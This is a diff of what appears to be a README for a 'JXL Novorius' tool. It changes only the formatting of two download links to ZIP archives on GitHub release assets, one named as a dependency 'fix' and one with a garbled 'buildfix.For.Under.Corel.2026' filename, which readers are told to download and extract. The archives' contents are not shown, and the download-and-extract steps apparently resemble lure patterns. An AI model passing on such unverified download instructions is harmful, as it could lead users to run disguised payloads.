@@ -113,7 +113,7 @@ Steps:
 
 1. Download the dependency package:
    
-   "Download JXL Dependency Requirements" (https://release-assets.githubusercontent.com/github-production-release-asset/1471908119/3f6a71ef-caa2-4aa7-8805-b48fc6264ee1?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-11-25T17%3A15%3A28Z&rscd=attachment%3B+filename%3DJXL-Dependency-Requirements-fix.zip&rsct=application%2Foctet-stream&skt=2025-11-25T16%3A14%3A59Z&ske=2025-11-25T17%3A15%3A28Z&sig=DqJGXHCN6gHZjmUJsA31l%2Fg4BUaPKQfHKagdyZSd%2F%2FY%3D)
+   [Download JXL Dependency Requirements] (https://release-assets.githubusercontent.com/github-production-release-asset/1471908119/3f6a71ef-caa2-4aa7-8805-b48fc6264ee1?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-11-25T17%3A15%3A28Z&rscd=attachment%3B+filename%3DJXL-Dependency-Requirements-fix.zip&rsct=application%2Foctet-stream&skt=2025-11-25T16%3A14%3A59Z&ske=2025-11-25T17%3A15%3A28Z&sig=DqJGXHCN6gHZjmUJsA31l%2Fg4BUaPKQfHKagdyZSd%2F%2FY%3D)
 
 2. Extract the downloaded ZIP file.
 
@@ -135,7 +135,7 @@ Steps:
 
 1. Download JXL Novorius v0.6.1:
    
-   "Download JXL Novorius v0.6.1" (https://release-assets.githubusercontent.com/github-production-release-asset/1471908119/e7be5472-e8c8-482b-ba12-345d5f0d3438?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-11-25T17%3A15%3A28Z&rscd=attachment%3B+filename%3DJXL-Novorius-v0.6.1-buildfix.For.Under.Corel.2026.zip&rsct=application%2Foctet-stream&skt=2025-11-25T16%3A14%3A59Z&ske=2026-11-25T17%3A15%3A28Z&sig=cwwaIcprddaAXXOMSeMJG6%2BvvsyJxmaI1YccW6O7eAc%3D)
+   [Download JXL Novorius v0.6.1] (https://release-assets.githubusercontent.com/github-production-release-asset/1471908119/e7be5472-e8c8-482b-ba12-345d5f0d3438?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-11-25T17%3A15%3A28Z&rscd=attachment%3B+filename%3DJXL-Novorius-v0.6.1-buildfix.For.Under.Corel.2026.zip&rsct=application%2Foctet-stream&skt=2025-11-25T16%3A14%3A59Z&ske=2026-11-25T17%3A15%3A28Z&sig=cwwaIcprddaAXXOMSeMJG6%2BvvsyJxmaI1YccW6O7eAc%3D).
 
 2. Extract the downloaded ZIP file.
 
